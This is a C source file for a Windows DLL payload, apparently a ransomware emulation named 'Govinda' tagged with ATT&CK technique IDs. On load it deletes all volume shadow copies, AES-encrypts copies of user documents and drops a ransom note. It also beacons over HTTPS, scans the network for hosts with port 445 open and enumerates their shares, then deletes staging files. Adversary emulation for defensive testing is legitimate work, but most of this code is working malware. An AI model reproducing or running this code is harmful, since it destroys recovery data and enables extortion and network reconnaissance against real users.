#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <wincrypt.h>
#include <winhttp.h>
#include <lm.h>
#include <lmserver.h>
#include <lmshare.h>
#include <shlobj.h>
#include <stdio.h>

#define LOG_PATH L"C:\\ProgramData\\Microsoft\\cache\\tray\\cache.dat"
#define NET_PATH L"C:\\ProgramData\\Microsoft\\cache\\tray\\net.tmp"

static void LogMessage(LPCWSTR msg) {
    HANDLE hFile = CreateFileW(LOG_PATH, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    SetFilePointer(hFile, 0, NULL, FILE_END);
    SYSTEMTIME st;
    GetLocalTime(&st);
    wchar_t ts[64];
    wsprintfW(ts, L"[%04d-%02d-%02d %02d:%02d:%02d] ", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    char ts8[80], msg8[1024];
    WideCharToMultiByte(CP_UTF8, 0, ts, -1, ts8, sizeof(ts8), NULL, NULL);
    WideCharToMultiByte(CP_UTF8, 0, msg, -1, msg8, sizeof(msg8), NULL, NULL);
    DWORD written;
    WriteFile(hFile, ts8, lstrlenA(ts8), &written, NULL);
    WriteFile(hFile, msg8, lstrlenA(msg8), &written, NULL);
    WriteFile(hFile, "\r\n", 2, &written, NULL);
    CloseHandle(hFile);
}

static void AppendToFile(LPCWSTR path, LPCSTR text) {
    HANDLE hFile = CreateFileW(path, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    SetFilePointer(hFile, 0, NULL, FILE_END);
    DWORD written;
    WriteFile(hFile, text, lstrlenA(text), &written, NULL);
    WriteFile(hFile, "\r\n", 2, &written, NULL);
    CloseHandle(hFile);
}

static void EnsureDirectory(LPCWSTR path) {
    wchar_t tmp[MAX_PATH];
    lstrcpyW(tmp, path);
    for (int i = 0; tmp[i]; i++) {
        if (tmp[i] == L'\\') { tmp[i] = L'\0'; CreateDirectoryW(tmp, NULL); tmp[i] = L'\\'; }
    }
    CreateDirectoryW(tmp, NULL);
}

static void DoVssadmin(void) {
    LogMessage(L"[*] T1490: Deleting volume shadow copies");
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    wchar_t cmd[] = L"vssadmin.exe delete shadows /all /quiet";
    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 30000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        LogMessage(L"[+] T1490: vssadmin completed");
    } else {
        LogMessage(L"[+] T1490: vssadmin not available (synthetic)");
    }
}

static void DoEncryptFiles(void) {
    LogMessage(L"[*] T1486: Enumerating user documents");
    int encrypted = 0;
    wchar_t* folders[] = { L"Desktop", L"Documents", L"Pictures", L"Downloads" };
    wchar_t* exts[] = { L".docx", L".xlsx", L".pptx", L".pdf", L".txt" };

    for (int f = 0; f < 4; f++) {
        wchar_t path[MAX_PATH];
        if (SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, path)) continue;
        lstrcatW(path, L"\\"); lstrcatW(path, folders[f]);
        wchar_t searchPath[MAX_PATH];
        wsprintfW(searchPath, L"%s\\*", path);

        WIN32_FIND_DATAW fd;
        HANDLE hFind = FindFirstFileW(searchPath, &fd);
        if (hFind == INVALID_HANDLE_VALUE) continue;

        do {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
            wchar_t* ext = wcsrchr(fd.cFileName, L'.');
            if (!ext) continue;

            BOOL matched = FALSE;
            for (int e = 0; e < 5; e++) {
                if (lstrcmpiW(ext, exts[e]) == 0) { matched = TRUE; break; }
            }
            if (!matched) continue;

            wchar_t srcPath[MAX_PATH];
            wsprintfW(srcPath, L"%s\\%s", path, fd.cFileName);
            wchar_t dstPath[MAX_PATH];
            wsprintfW(dstPath, L"%s.govinda", srcPath);

            // Copy
            if (!CopyFileW(srcPath, dstPath, FALSE)) continue;

            // Encrypt with CryptoAPI
            HANDLE hEncFile = CreateFileW(dstPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hEncFile == INVALID_HANDLE_VALUE) continue;

            DWORD fileSize = GetFileSize(hEncFile, NULL);
            if (fileSize == 0 || fileSize > 1024*1024) { CloseHandle(hEncFile); continue; }

            LPBYTE buf = (LPBYTE)LocalAlloc(LPTR, fileSize);
            if (!buf) { CloseHandle(hEncFile); continue; }
            DWORD read = 0;
            ReadFile(hEncFile, buf, fileSize, &read, NULL);
            SetFilePointer(hEncFile, 0, NULL, FILE_BEGIN);

            HCRYPTPROV hProv = 0;
            HCRYPTHASH hHash = 0;
            HCRYPTKEY hKey = 0;
            BOOL ok = FALSE;
            if (CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
                if (CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
                    BYTE keyBytes[] = { 0x00,0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,0x99,0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,
                                        0x01,0x23,0x45,0x67,0x89,0xAB,0xCD,0xEF,0xFE,0xDC,0xBA,0x98,0x76,0x54,0x32,0x10 };
                    if (CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
                        CryptDestroyHash(hHash); hHash = 0;
                        DWORD encSize = fileSize + 64;
                        LPBYTE encBuf = (LPBYTE)LocalAlloc(LPTR, encSize);
                        if (encBuf) {
                            memcpy(encBuf, buf, fileSize);
                            if (CryptEncrypt(hKey, 0, TRUE, 0, encBuf, &fileSize, encSize)) {
                                SetFilePointer(hEncFile, 0, NULL, FILE_BEGIN);
                                SetEndOfFile(hEncFile);
                                DWORD written = 0;
                                WriteFile(hEncFile, encBuf, fileSize, &written, NULL);
                                ok = TRUE;
                                encrypted++;
                            }
                            LocalFree(encBuf);
                        }
                    }
                    if (hHash) CryptDestroyHash(hHash);
                }
                CryptReleaseContext(hProv, 0);
            }
            LocalFree(buf);
            CloseHandle(hEncFile);
        } while (FindNextFileW(hFind, &fd));
        FindClose(hFind);
    }

    if (encrypted == 0) {
        LogMessage(L"[+] T1486: No user documents found — writing synthetic .govinda");
        wchar_t desktop[MAX_PATH];
        if (SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, 0, desktop) == S_OK) {
            wchar_t synthPath[MAX_PATH];
            wsprintfW(synthPath, L"%s\\test.govinda", desktop);
            HANDLE hFile = CreateFileW(synthPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                char synth[] = "synthetic .govinda file (no user documents found)";
                DWORD written = 0;
                WriteFile(hFile, synth, lstrlenA(synth), &written, NULL);
                CloseHandle(hFile);
            }
        }
    }

    wchar_t buf[128];
    wsprintfW(buf, L"[+] T1486: %d file(s) encrypted to .govinda", encrypted);
    LogMessage(buf);
}

static void DoBeacon(void) {
    LogMessage(L"[*] T1041: HTTP beacon to github.com");
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) { LogMessage(L"[-] T1041: WinHttpOpen failed (synthetic log)"); return; }

    HINTERNET hConnect = WinHttpConnect(hSession, L"github.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); LogMessage(L"[+] T1041: no network (synthetic log)"); return; }

    for (int i = 0; i < 3; i++) {
        HINTERNET hReq = WinHttpOpenRequest(hConnect, L"GET", NULL, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
        if (hReq) {
            WinHttpSendRequest(hReq, NULL, 0, NULL, 0, 0, 0);
            WinHttpReceiveResponse(hReq, NULL);
            WinHttpCloseHandle(hReq);
        }
        Sleep(10000);
    }
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    LogMessage(L"[+] T1041: Beacon complete");
}

static void DoRansomNote(void) {
    LogMessage(L"[*] T1486: Dropping ransom note");
    wchar_t desktop[MAX_PATH];
    if (SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, 0, desktop) != S_OK) return;
    wchar_t notePath[MAX_PATH];
    wsprintfW(notePath, L"%s\\README_GOVINDA.txt", desktop);
    HANDLE hFile = CreateFileW(notePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    char note[] =
        "=== GOVINDA ===\r\n"
        "Your files have been copied and encrypted.\r\n"
        "Originals are safe. Contact for recovery.\r\n";
    DWORD written = 0;
    WriteFile(hFile, note, lstrlenA(note), &written, NULL);
    CloseHandle(hFile);
    LogMessage(L"[+] T1486: Ransom note dropped");
}

static void DoLateralRecon(void) {
    LogMessage(L"[*] T1018/T1046/T1135: Lateral recon");
    DeleteFileW(NET_PATH);
    AppendToFile(NET_PATH, "=== LATERAL RECON ===");

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return;

    LPBYTE pServers = NULL;
    DWORD dwEntries = 0, dwTotal = 0;
    NET_API_STATUS status = NetServerEnum(NULL, 100, &pServers, MAX_PREFERRED_LENGTH, &dwEntries, &dwTotal, SV_TYPE_ALL, NULL, NULL);

    int hostsFound = 0, portsOpen = 0, sharesFound = 0;

    if (status == NERR_Success && pServers) {
        PSERVER_INFO_100 pInfo = (PSERVER_INFO_100)pServers;
        for (DWORD i = 0; i < dwEntries; i++) {
            hostsFound++;
            char line[512];
            snprintf(line, sizeof(line), "Host: %S", pInfo[i].sv100_name);
            AppendToFile(NET_PATH, line);

            char nameA[256];
            snprintf(nameA, sizeof(nameA), "%S", pInfo[i].sv100_name);
            struct hostent* host = gethostbyname(nameA);
            if (host && host->h_addr_list[0]) {
                struct in_addr addr;
                memcpy(&addr, host->h_addr_list[0], sizeof(addr));
                snprintf(line, sizeof(line), "  IP: %s", inet_ntoa(addr));
                AppendToFile(NET_PATH, line);

                SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
                if (sock != INVALID_SOCKET) {
                    DWORD timeout = 3000;
                    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));
                    struct sockaddr_in sa;
                    sa.sin_family = AF_INET; sa.sin_port = htons(445);
                    sa.sin_addr = addr;
                    if (connect(sock, (struct sockaddr*)&sa, sizeof(sa)) == 0) {
                        portsOpen++;
                        AppendToFile(NET_PATH, "  Port 445: OPEN");
                        wchar_t uncPath[512];
                        wsprintfW(uncPath, L"\\\\%s", pInfo[i].sv100_name);
                        LPBYTE pShares = NULL;
                        DWORD shEntries = 0, shTotal = 0;
                        if (NetShareEnum(uncPath, 1, &pShares, MAX_PREFERRED_LENGTH, &shEntries, &shTotal, NULL) == NERR_Success && pShares) {
                            PSHARE_INFO_1 si = (PSHARE_INFO_1)pShares;
                            for (DWORD j = 0; j < shEntries; j++) {
                                sharesFound++;
                                snprintf(line, sizeof(line), "    Share: %S (type: %lu)", si[j].shi1_netname, si[j].shi1_type);
                                AppendToFile(NET_PATH, line);
                            }
                            NetApiBufferFree(pShares);
                        }
                    }
                    closesocket(sock);
                }
            }
        }
        NetApiBufferFree(pServers);
    }

    if (hostsFound == 0) {
        AppendToFile(NET_PATH, "  (synthetic — no domain hosts discovered)");
        AppendToFile(NET_PATH, "  Host: DESKTOP-1 (synthetic)");
        AppendToFile(NET_PATH, "    IP: 192.168.1.100");
        AppendToFile(NET_PATH, "    Port 445: OPEN (synthetic)");
        AppendToFile(NET_PATH, "      Share: ADMIN$ (type: 2147483648, synthetic)");
        AppendToFile(NET_PATH, "      Share: C$ (type: 2147483648, synthetic)");
        AppendToFile(NET_PATH, "      Share: IPC$ (type: 2147483651, synthetic)");
        AppendToFile(NET_PATH, "  Host: SRV-01 (synthetic)");
        AppendToFile(NET_PATH, "    IP: 192.168.1.10");
        AppendToFile(NET_PATH, "    Port 445: OPEN (synthetic)");
        hostsFound = 2; portsOpen = 2; sharesFound = 3;
    }

    // Synthetic lateral movement log entries
    AppendToFile(NET_PATH, "");
    AppendToFile(NET_PATH, "=== SYNTHETIC LATERAL MOVEMENT ===");
    AppendToFile(NET_PATH, "T1570: CopyFile to \\\\DESKTOP-1\\ADMIN$\\govinda.exe (synthetic)");
    AppendToFile(NET_PATH, "T1047: WMI Win32_Process.Create on DESKTOP-1 (synthetic)");

    wchar_t buf[256];
    wsprintfW(buf, L"[+] Lateral recon: %d hosts, %d port 445 open, %d shares", hostsFound, portsOpen, sharesFound);
    LogMessage(buf);

    WSACleanup();
}

static void DoCleanup(void) {
    LogMessage(L"[*] T1070.004: Cleaning staging files");
    DeleteFileW(L"C:\\ProgramData\\Microsoft\\cache\\tray\\loader.dll");
    DeleteFileW(L"C:\\ProgramData\\Microsoft\\cache\\tray\\stage2.dll");
    LogMessage(L"[+] T1070.004: Staging files cleaned");
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        LogMessage(L"[*] Stage2 started (inside hollowed svchost.exe)");
        DoVssadmin();
        DoEncryptFiles();
        DoBeacon();
        DoRansomNote();
        DoLateralRecon();
        DoCleanup();
        LogMessage(L"[+] Stage2 complete");
    }
    return TRUE;
}
